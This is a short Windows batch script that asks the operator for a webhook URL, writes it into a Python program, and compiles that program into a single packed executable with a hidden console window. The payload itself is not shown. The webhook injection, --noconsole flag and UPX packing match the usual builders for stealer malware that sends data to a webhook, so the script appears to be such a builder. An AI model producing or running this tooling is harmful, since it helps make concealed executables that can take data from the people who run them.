@ECHO OFF

PYTHON -c "exec('''with open('main.py', 'r', encoding='utf-8') as f: content = f.read().replace('WEBHOOK_URL', str(input('Webhook URL: ')))\nwith open('write.py', 'w', encoding='utf-8') as f: f.write(content)''')"
ECHO INTALLING REQUIREMENTS && pip install --upgrade -r requirements.txt
ECHO INSTALLING UPX && curl -L -O https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip && unzip upx-3.96-win64.zip && mv upx-3.96-win64 upx && del upx-3.96-win64.zip
ECHO COMPILING TO EXE && python -m PyInstaller --onefile --noconsole --upx-dir ./upx -i NONE --distpath ./ .\write.py 
ECHO REMOVING BUILD FILES && PYTHON -c "import os;import shutil;exec('''for file in ['build', '__pycache__', 'write.spec', 'upx-3.96-win64.zip', 'upx']:\n    if os.path.exists(file): os.remove(file) if os.path.isfile(file) else shutil.rmtree(file)''')      "
COLOR 02 && ECHO DONE && ECHO EXE GENERATED AS WRITE.EXE && START .
PAUSE && COLOR 07 && EXIT